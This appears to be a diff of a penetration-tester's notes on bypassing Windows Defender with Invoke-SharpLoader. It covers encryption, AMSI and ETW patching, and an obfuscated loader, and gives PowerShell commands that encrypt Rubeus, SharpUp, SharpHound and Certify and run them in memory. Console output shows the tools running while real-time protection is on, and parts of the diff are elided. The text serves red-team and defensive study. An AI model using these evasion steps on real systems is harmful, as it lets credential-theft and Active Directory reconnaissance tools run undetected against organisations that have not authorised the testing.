@@ -4,23 +4,29 @@ AV bypass using the tool 'Invoke-SharpLoader'
 
 Source => https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
 
-Load encrypted and compressed C# Code from a remote Webserver or from a local file straight to memory and execute it there to bypass AV solutions.
+The objective is to load encrypted and compressed offensive security C# file from a remote Webserver or from a local disk straight into memory and execute it there.
 
-Two scripts are used:
-> Invoke-SharpEncrypt.ps1 is used to encrypt and compressed existing C# files.
-> Invoke-SharpLoader.ps1 is used to decrypt and load into memory the encrypted C# files.
+AV evasion techniques used:
+---------------------------
+> Encryption
+> AMSI patching
+> ETW patching
+
+There are two scripts:
+> Invoke-SharpEncrypt.ps1 - It is used to encrypt and compressed offensive security C# files such as Rubeus.exe, SharpUp.exe, Sharphound.exe...
+> Invoke-SharpLoader.ps1 - It is used to decrypt and load straight into memory the offensive security C# files.
 
 Important note: 
 > I had to obfuscate the script "Invoke-SharpLoader.ps1" beacause the version available on Github is now flaged by multiple AV solutions (e.g. Windows Defednder AV). 
 
 
-==========================================================================================================================================================
+===========================================================================================================================================================
 PoC 1 - Examples with the tools Rubeus.exe, SharpUp.exe, Sharphound.exe & Certify.exe running on a Windows 10 laptop (with Defender AV enabled & up-to-date)
-==========================================================================================================================================================
+===========================================================================================================================================================
 
---------------------------------------------------------------------------------------------------------------------------
-Step 1 - Use 'Invoke-SharpEncrypt' to generate an encrypted version of the tools Rubeus.exe, SharpUp.exe and Certify.exe
---------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Use 'Invoke-SharpEncrypt' to generate an encrypted version of the tools Rubeus.exe, SharpUp.exe, Sharphound.exe & Certify.exe 
+---------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\Users\Administrator\Documents\Tools-Pentest\Invoke-SharpLoader-master> Invoke-SharpEncrypt -file C:\Users\Administrator\Documents\Rubeus.exe 
                                                                              -password SuperPassword2022 -outfile C:\temp\EncryptedRubeus.enc
@@ -105,6 +111,9 @@ PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtect
 RealTimeProtectionEnabled : True
 IoavProtectionEnabled     : True
 AntispywareEnabled        : True
+
+
+PS C:\temp> . .\Invoke-Sharp-Loader-Custom.ps1
 
 
 PS C:\temp> Invoke-Sharp-Loader-Custom -location C:\temp\EncryptedRubeus.enc -password SuperPassword2022 -argument currentluid
@@ -223,3 +232,14 @@ NO URL, loading from disk.
 2022-12-23T05:01:59.6844959+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
 2022-12-23T05:01:59.6864500+01:00|INFORMATION|Initializing SharpHound at 05:01 on 23/12/2022
 <SNIP>
+
+
+PS C:\temp> amsiscanbuffer
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
+again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
